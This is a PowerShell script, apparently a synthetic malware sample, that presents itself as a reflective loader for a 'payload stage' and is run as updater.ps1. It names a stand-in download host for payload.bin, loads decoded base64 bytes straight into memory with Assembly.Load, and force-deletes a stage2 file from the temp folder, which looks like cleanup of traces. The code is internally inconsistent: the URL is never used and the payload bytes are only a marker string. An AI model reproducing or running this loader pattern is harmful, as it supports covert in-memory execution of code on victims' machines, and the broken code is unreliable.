<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.

.EXAMPLE
    PS> .\updater.ps1
#>
[CmdletBinding()]
param(
    [string]$FetchUrl = "http://203.0.113.8:8080/payload.bin",
    [int]$TimeoutSec = 51
)
$ErrorActionPreference = "Stop"

$PayloadBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjp1cXh4Yzd6bm5i')
Write-Verbose ("Assembly byte count: " + $PayloadBytes.Length)
$FetchResult = [Reflection.Assembly]::Load($PayloadBytes)
if ($null -ne $FetchResult) {
    Write-Verbose ("Loaded assembly: " + $FetchResult.FullName)
}

Write-Verbose "stage marker 37 reached"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
